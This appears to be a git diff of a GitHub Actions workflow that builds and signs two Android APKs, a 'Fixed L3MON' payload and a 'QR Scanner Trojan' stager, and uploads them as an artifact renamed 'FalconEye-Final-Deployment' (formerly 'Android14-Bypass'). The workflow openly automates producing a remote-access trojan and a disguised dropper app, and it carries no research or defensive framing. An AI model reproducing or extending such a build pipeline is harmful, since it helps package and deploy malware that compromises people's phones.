@@ -23,19 +23,19 @@ jobs:
 
       - name: Build Payload (Fixed L3MON)
         run: |
-          # The payload is now in the /payload directory
+          # Use the NEW folder name: /payload
           java -jar apktool.jar b ./payload -o unsigned_payload.apk
           java -jar sign.jar -a unsigned_payload.apk --allowResign
 
       - name: Build Stager (QR Scanner Trojan)
         run: |
-          # The stager is now in the /stager directory
+          # Use the NEW folder name: /stager
           java -jar apktool.jar b ./stager -o unsigned_stager.apk
           java -jar sign.jar -a unsigned_stager.apk --allowResign
 
       - name: Upload Artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: FalconEye-Android14-Bypass
+          name: FalconEye-Final-Deployment
           path: |
             *-aligned-debugSigned.apk
